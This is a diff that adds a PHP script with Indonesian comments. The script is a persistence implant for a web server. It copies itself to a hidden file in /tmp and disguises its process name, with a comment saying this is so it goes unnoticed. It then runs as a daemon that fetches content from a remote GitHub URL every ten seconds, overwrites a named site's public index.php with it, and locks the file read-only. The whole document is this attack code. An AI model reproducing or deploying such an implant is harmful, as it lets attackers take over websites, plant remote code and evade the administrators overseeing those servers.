@@ -1,0 +1,55 @@
+<?php
+$targetFile = "/home/nepaleco/public_html/public/index.php";
+$sourceURL = "https://raw.githubusercontent.com/boyas2/aboyas/refs/heads/main/122.txt";
+
+// Path sementara untuk daemon
+$tmpPath = "/tmp/.daemon.system.php";
+
+// Jika belum ada di /tmp/, copy diri sendiri dan jalankan dari sana
+if (__FILE__ !== $tmpPath) {
+    copy(__FILE__, $tmpPath);
+    chmod($tmpPath, 0755);
+    shell_exec("php $tmpPath &");
+    exit();
+}
+
+// Ubah nama process biar gak ketahuan
+cli_set_process_title("System_Core_Update");
+
+// Forking jadi daemon
+$pid = pcntl_fork();
+if ($pid > 0) { exit(); }
+posix_setsid();
+
+// Loop setiap 10 detik
+while (true) {
+    // Ambil konten dari URL
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $sourceURL);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $newContent = curl_exec($ch);
+    curl_close($ch);
+
+    // Jika gagal ambil konten, skip iterasi ini
+    if (!$newContent) {
+        sleep(10);
+        continue;
+    }
+
+    // Cek apakah index.php ada
+    if (file_exists($targetFile)) {
+        $existingContent = file_get_contents($targetFile);
+    } else {
+        $existingContent = "";
+    }
+
+    // Jika konten berbeda, update index.php
+    if (md5($existingContent) !== md5($newContent)) {
+        @chmod($targetFile, 0644);
+        @file_put_contents($targetFile, $newContent);
+        @chmod($targetFile, 0444);
+    }
+
+    sleep(10); // Loop setiap 10 detik
+}
+?>
